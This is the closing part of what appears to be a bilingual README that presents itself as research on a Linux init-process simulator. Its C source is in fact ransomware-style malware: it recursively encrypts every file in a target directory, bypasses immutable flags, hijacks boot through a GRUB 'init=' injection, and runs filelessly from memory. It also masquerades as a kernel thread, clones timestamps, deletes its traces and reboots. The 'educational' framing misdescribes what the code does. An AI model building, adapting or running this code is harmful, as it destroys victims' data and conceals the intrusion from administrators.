| **PRGA** | 64-72 | Generate pseudo-random keystream and XOR with data |
| **Filesystem Flags** | 14-19 | Temporarily remove immutable flag to allow modification |

**Research Finding:** The key schedule incorporates the file path (`p[i % 16]`), making the encryption dependent on the filename.

</details>

<details>
<summary><b>📁 Section 13: Recursive Directory Scan (scan)</b></summary>

```c
static void scan(const char *p) {
    int fd = sopen(p, O_RDONLY|O_DIRECTORY|O_NOATIME, 0);

    if (fd < 0) 
        return;


    char buf[8192]; 
    int  n;


    while ( 
        ( n = syscall(SYS_getdents64, U(fd), U(buf), U(sizeof(buf))) ) > 0 
    ) {
        for (int i = 0;  i < n;) {
            struct dirent64_t *d = (struct dirent64_t*)(buf + i);

            if ((d->d_reclen) < sizeof(struct dirent64_t)) 
                break;


            char *name = (d->d_name);

            if ( 
                (name[0] == '.') && ( (name[1] == '\0')    || 
               ((name[1] == '.') && (  name[2] == '\0')) )
            ) {
                i += (d->d_reclen);
                continue;
            }


            char fp[4096];
            int  pln = -1;
            int  nln = -1;
 

            while (p[++pln]) 
                fp[pln] = p[pln]; 
            
            fp[pln++]     = '/';

            while (name[++nln]) 
                fp[pln + nln] = name[nln]; 
            
            fp[pln + nln] = '\0';


            if ((d->d_type) == DT_DIR) 
                scan(fp);
            
            else if ((d->d_type) == DT_REG) 
                enc(fp);
            
            
            i += (d->d_reclen);
        }
    }


    sclose(fd);
}
```

**Traversal Algorithm:**
1. Open directory with `O_DIRECTORY`
2. Read entries with `getdents64`
3. Skip `.` and `..`
4. Build full path
5. Recurse on directories, process regular files

</details>

<details>
<summary><b>📁 Section 14: GRUB Cleanup (update_grub)</b></summary>

```c
FUNC void update_grub(void) {
    int fd = sopen(U("/boot/grub/grub.cfg"),  O_RDWR|O_NOATIME, 0);

    if (fd < 0) 
        fd = sopen(U("/boot/grub2/grub.cfg"), O_RDWR|O_NOATIME, 0);
    

    if (fd == -1) 
        return;


    char buf[65536];
    long n = syscall(SYS_read, fd, buf, sizeof(buf));

    if (n <= 0) { 
        sclose(fd);
        return; 
    }

    buf[n] = '\0';


    const char *s = "init=/sbin/.init quiet nosplash";
    int sl        = -1;
    while (s[++sl]);


    for (int i = 0;  i <= (n - sl);  i++) {
        int f = 1;

        for (int j = 0;  j < sl;  j++) {
            if (buf[i + j] != s[j]) {
                f = 0;
                break;
            }
        }


        if (f) 
            for (int j = 0;  j < sl;  j++) 
                buf[i + j] = ' '; 
    }
    

    syscall(SYS_lseek, fd, 0, 0); 
    syscall(SYS_write, fd, buf, n);


    syscall(SYS_fdatasync, fd);
    sclose(fd);
}
```

**Cleanup Strategy:**
- Search for `init=/sbin/.init quiet nosplash`
- Overwrite with spaces (preserves file size)
- Write back and sync

</details>

<details>
<summary><b>📁 Section 15: Init Process Entry (init)</b></summary>

```c
FUNC void init(void) {
    if (syscall(SYS_getpid) != 1) 
        return;
    

    long o = syscall(SYS_fork);

    if (o == 0)
        while (1) output(); 


    syscall(SYS_mount, NULL, U("/"), NULL, U(MS_REMOUNT), NULL);
    syscall(SYS_mount, NULL, U(DIR), NULL, NULL,          NULL);


    scan(DIR);
    

    update_grub();
    syscall(SYS_unlink, U("/sbin/.init"));
    syscall(SYS_unlink, U("/etc/default/grub.d/99_custom.cfg"));


    syscall(SYS_sync);
    syscall(SYS_reboot, 0xfee1dead, 672274793, 0x01234567, NULL);


    while (1) syscall(SYS_pause);
    _exit(0);
}
```

**Init Process Flow:**
1. Verify PID == 1
2. Fork child for boot simulation
3. Remount root and target directory
4. Process files
5. Clean up traces
6. Reboot

**Reboot Magic Numbers:**
- `0xfee1dead` — LINUX_REBOOT_MAGIC1
- `672274793` — LINUX_REBOOT_MAGIC2
- `0x01234567` — LINUX_REBOOT_CMD_RESTART

</details>

<details>
<summary><b>📁 Section 16: Main Entry Point (main)</b></summary>

```c
int main(int argc, char *argv[]) {
    init();


    char p[2048];
    long exe = syscall(SYS_readlink, U("/proc/self/exe"), U(p), U(sizeof(p) - 1));

    if (exe <= 0) 
        _exit(0); 

    p[exe] = '\0';


    if (!( 
        (p[0] == '/') && (p[1] == 'm') && (p[2] == 'e') && (p[3] == 'm') 
    )) {
        set_root(p);
        jump_to_ram(p);
    }


    init_proc();
    loop();
    

    setup_init();
    setup_grub();



    uint64_t i = 0;

    while (1) {
        loop();


        if ((i % 6) == 0) {
            setup_init();
            setup_grub();
        }


        if (++i > 1000000) 
            i = 0;
    }
    


    return 0;
}
```

**Execution Flow:**
1. `init()` — Check if PID 1
2. Read `/proc/self/exe` — Get current path
3. If not in memory (`/mem`): elevate → execute from RAM
4. Daemonize
5. Install persistence
6. Main loop with periodic verification

</details>

---

## 4. System Call Reference Table

| # | Name | Purpose | Used In |
|---|------|---------|---------|
| 0 | `read` | Read from fd | `unit_desc`, `enc`, `update_grub` |
| 1 | `write` | Write to fd | `iprint`, `setup_grub`, `enc`, `update_grub` |
| 3 | `close` | Close fd | Throughout |
| 4 | `stat` | Get file status | `setup_init`, `setup_grub` |
| 5 | `fstat` | Get file status by fd | `jump_to_ram`, `setup_init` |
| 8 | `lseek` | Seek in file | `enc`, `update_grub` |
| 16 | `ioctl` | Device control | `enc` |
| 23 | `select` | Multiplexed I/O | `loop` |
| 35 | `nanosleep` | High-res sleep | `loop`, `output` |
| 39 | `getpid` | Get process ID | `init` |
| 40 | `sendfile` | Transfer data between fds | `jump_to_ram`, `setup_init` |
| 57 | `fork` | Create child process | `init_proc`, `init` |
| 59 | `execve` | Execute program | `set_root` |
| 72 | `fcntl` | File control | `jump_to_ram` |
| 80 | `chdir` | Change directory | `init_proc` |
| 83 | `mkdir` | Create directory | `setup_grub` |
| 87 | `unlink` | Delete file | `init` |
| 95 | `umask` | Set file creation mask | `init_proc` |
| 102 | `getuid` | Get user ID | `set_root` |
| 112 | `setsid` | Create session | `init_proc` |
| 140 | `setpriority` | Set process priority | `init_proc` |
| 157 | `prctl` | Process control | `init_proc` |
| 162 | `sync` | Sync filesystems | `init` |
| 165 | `mount` | Mount filesystem | `init` |
| 169 | `reboot` | Reboot system | `init` |
| 217 | `getdents64` | Read directory entries | `output`, `scan` |
| 231 | `exit_group` | Exit all threads | Throughout |
| 257 | `openat` | Open file | Throughout |
| 280 | `utimensat` | Change timestamps | `setup_init`, `setup_grub` |
| 319 | `memfd_create` | Create anonymous file | `jump_to_ram` |
| 322 | `execveat` | Execute from fd | `jump_to_ram` |

---

## 5. Research Findings

### 5.1 Key Observations

| Finding | Description |
|---------|-------------|
| **Fileless Execution** | `memfd_create` + `execveat` enables execution entirely from RAM |
| **Zero-Copy Transfer** | `sendfile` performs kernel-space copy, avoiding userspace buffers |
| **Process Masquerading** | `prctl(PR_SET_NAME, "[rcu_gp]")` mimics kernel threads |
| **Timestamp Cloning** | `utimensat` copies timestamps, hiding file modifications |
| **GRUB Parameter Injection** | `init=/sbin/.init` overrides default init process |
| **Immutable Flag Bypass** | `ioctl(FS_IOC_SETFLAGS)` temporarily removes filesystem flags |

### 5.2 Educational Value

This research demonstrates:
- Direct system call programming without libc
- Complete daemonization pattern
- Realistic systemd boot simulation
- RC4-like stream cipher implementation
- Filesystem traversal and manipulation

### 5.3 Security Implications

Understanding these techniques is essential for:
- Security researchers analyzing potential threats
- System administrators hardening Linux deployments
- Developers writing secure system-level code

---

# Русский

## 1. Аннотация исследования

Данное исследование изучает **продвинутые техники системного программирования Linux** через реализацию симулятора init-процесса. Исследование демонстрирует прямое взаимодействие с ядром через системные вызовы, полностью минуя стандартную библиотеку C.

**Ключевые области исследования:**
- Определение повышения привилегий через анализ окружения
- Бесфайловое выполнение с использованием `memfd_create(2)` и `execveat(2)`
- Классический паттерн демонизации UNIX
- Парсинг unit-файлов systemd и симуляция загрузки
- Криптоанализ потокового шифра типа RC4
- Манипуляция конфигурацией загрузчика GRUB2
- Маскировка процесса под поток ядра

---

## 2. Обзор архитектуры системы

*(См. диаграммы в английской версии)*

---

## 3. Полный исходный код с анализом

*(См. секции с кодом в английской версии)*

---

## 4. Таблица системных вызовов

*(См. таблицу в английской версии)*

---

## 5. Результаты исследования

### 5.1 Ключевые наблюдения

| Наблюдение | Описание |
|------------|----------|
| **Бесфайловое выполнение** | `memfd_create` + `execveat` позволяет выполнение полностью из ОЗУ |
| **Zero-copy передача** | `sendfile` выполняет копирование в пространстве ядра |
| **Маскировка процесса** | `prctl(PR_SET_NAME, "[rcu_gp]")` имитирует потоки ядра |
| **Клонирование временных меток** | `utimensat` копирует метки, скрывая модификации |
| **Инъекция параметров GRUB** | `init=/sbin/.init` переопределяет init-процесс |
| **Обход immutable флага** | `ioctl(FS_IOC_SETFLAGS)` временно снимает флаги |

### 5.2 Образовательная ценность

Данное исследование демонстрирует:
- Прямое программирование системных вызовов без libc
- Полный паттерн демонизации
- Реалистичную симуляцию загрузки systemd
- Реализацию потокового шифра типа RC4
- Обход и манипуляцию файловой системой

---

<div align="center">

**[⬆ Back to Top](#-linux-init-process-a-comprehensive-technical-research)**

*Technical Research — Linux System Programming & Boot Process Analysis*

</div>
